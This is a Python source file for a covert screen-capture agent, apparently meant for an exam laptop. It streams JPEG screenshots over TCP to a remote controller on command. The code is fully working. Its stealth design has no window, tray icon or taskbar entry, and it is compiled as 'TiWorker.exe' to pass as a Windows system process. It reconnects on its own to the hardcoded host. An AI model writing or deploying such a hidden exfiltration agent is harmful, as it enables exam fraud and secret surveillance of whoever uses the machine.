"""
Ghost Agent — headless DXGI screen capture agent.

Runs on the exam laptop. Captures the screen at native resolution
(1920x1080) using the DXGI Desktop Duplication API (via dxcam) and
streams JPEG frames to the Simulato controller over TCP.

Usage:
    python agent.py --host 192.168.1.100 --port 9500

Or as compiled .exe:
    TiWorker.exe --host 192.168.1.100 --port 9500

Protocol:
    1. Agent connects to Controller TCP server
    2. Sends 4-byte handshake magic: b"GHOS"
    3. Waits for 1-byte ACK: b"\\x06"
    4. Enters command loop:
       - 0x01 CAPTURE → grab screen, encode JPEG, send [4B len][JPEG]
       - 0x02 PING    → send [4B len][b"PONG"]
       - 0xFF SHUTDOWN → clean exit

The agent uses DXGI Desktop Duplication (same API as OBS, Discord,
Windows Game Bar).  It does NOT use GDI, PrintScreen, or clipboard.
No visible window, no tray icon, no taskbar entry.
"""

import argparse
import socket
import struct
import sys
import time

# ---------------------------------------------------------------------------
# Protocol constants
# ---------------------------------------------------------------------------
HANDSHAKE_MAGIC = b"GHOS"
ACK_BYTE = b"\x06"

CMD_CAPTURE = 0x01
CMD_PING = 0x02
CMD_SHUTDOWN = 0xFF

JPEG_QUALITY = 95
RECONNECT_BASE_DELAY = 1.0   # seconds
RECONNECT_MAX_DELAY = 10.0   # seconds


def _send_payload(sock: socket.socket, data: bytes) -> None:
    """Send a length-prefixed payload: [4B big-endian uint32 len][data]."""
    header = struct.pack(">I", len(data))
    sock.sendall(header + data)


def _grab_and_encode(camera) -> bytes:
    """Capture screen via DXGI and encode as JPEG bytes.

    Args:
        camera: dxcam.DXCamera instance.

    Returns:
        Raw JPEG bytes.
    """
    import cv2
    import numpy as np

    frame = camera.grab()
    if frame is None:
        # grab() can return None if no new frame is available.
        # Retry with a small delay.
        time.sleep(0.05)
        frame = camera.grab()

    if frame is None:
        # Still no frame — return a tiny placeholder so we don't crash.
        # This should be extremely rare (only if the GPU compositor is stalled).
        placeholder = np.zeros((1080, 1920, 3), dtype=np.uint8)
        _, buf = cv2.imencode(".jpg", placeholder)
        return buf.tobytes()

    # dxcam returns RGB; OpenCV expects BGR for imencode.
    frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    encode_params = [cv2.IMWRITE_JPEG_QUALITY, JPEG_QUALITY]
    _, buf = cv2.imencode(".jpg", frame_bgr, encode_params)
    return buf.tobytes()


def _connect_with_backoff(host: str, port: int) -> socket.socket:
    """Connect to the controller with exponential backoff retries."""
    delay = RECONNECT_BASE_DELAY
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((host, port))
            return sock
        except (OSError, ConnectionRefusedError):
            time.sleep(delay)
            delay = min(delay * 2, RECONNECT_MAX_DELAY)


def _do_handshake(sock: socket.socket) -> bool:
    """Perform the GHOS/ACK handshake. Returns True on success."""
    try:
        sock.sendall(HANDSHAKE_MAGIC)
        ack = sock.recv(1)
        return ack == ACK_BYTE
    except (OSError, socket.timeout):
        return False


def run_agent(host: str, port: int) -> None:
    """Main agent loop: connect, handshake, serve commands."""
    import dxcam

    camera = dxcam.create(output_color="RGB")

    while True:
        sock = _connect_with_backoff(host, port)

        if not _do_handshake(sock):
            sock.close()
            time.sleep(RECONNECT_BASE_DELAY)
            continue

        # Handshake succeeded — enter command loop.
        sock.settimeout(30.0)  # generous timeout for command reads
        try:
            while True:
                data = sock.recv(1)
                if not data:
                    # Controller closed connection.
                    break

                cmd = data[0]

                if cmd == CMD_CAPTURE:
                    jpeg_bytes = _grab_and_encode(camera)
                    _send_payload(sock, jpeg_bytes)

                elif cmd == CMD_PING:
                    _send_payload(sock, b"PONG")

                elif cmd == CMD_SHUTDOWN:
                    sock.close()
                    return  # clean exit

        except (OSError, socket.timeout, ConnectionResetError):
            pass  # connection lost — will reconnect
        finally:
            try:
                sock.close()
            except OSError:
                pass

        # Small delay before reconnect attempt.
        time.sleep(RECONNECT_BASE_DELAY)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Ghost Agent — headless DXGI screen capture",
        prog="TiWorker",
    )
    parser.add_argument(
        "--host",
        type=str,
        default="192.168.1.100",
        help="Controller IP address (default: 192.168.1.100)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=9500,
        help="Controller TCP port (default: 9500)",
    )
    args = parser.parse_args()

    try:
        run_agent(args.host, args.port)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
